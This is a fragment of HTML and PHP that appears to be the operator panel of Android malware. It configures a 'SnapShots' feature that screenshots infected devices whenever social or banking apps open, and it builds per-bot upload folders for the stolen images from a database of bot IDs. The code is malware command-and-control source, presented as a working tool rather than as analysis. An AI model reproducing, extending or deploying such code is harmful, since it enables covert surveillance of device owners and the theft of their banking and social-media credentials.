	...
	<main class="full-box main-container">
		...
		<section class="full-box page-content">
			...
			<div class="full-box page-header">
				<h3 class="text-left">
<i class="fas fa-expand fa-fw"></i>  &nbsp; SnapShots (#ROOT REQ)
				</h3>
			...
			<div class="container-fluid">
				<form action="" class="form-neon" autocomplete="off">
					<fieldset>
						<legend> &nbsp; Takes a screenshot of the device when social and banking apps were opened.</legend>
						<div class="container-fluid">
							<div class="row">
								<div class="col-12 col-md-6">
									<div class="form-group">
										<label for="ProductCode" class="bmd-label-floating">Time in seconds (Minimum is >=5 seconds)</label>
										<input type="text" pattern="[a-zA-Z0-9]{1,25}" class="form-control" id="ProductCode" maxlength="4">
									</div>
										<div onclick="myFunction()" class="button_cont" align="center"><a class="example_c"  target="_blank" rel="nofollow noopener">Update</a></div>
                 ...
                 if ($result = $mysqli->query($query)) {
                   ...
                   $botid = $row["clm_id"];
                         ...
                         $path = "../alienw/uploads/$botid/Pics";
				       $french = "../alienw/uploads/$botid/";
					     $paths = "../alienw/uploads/$botid/Pics/";
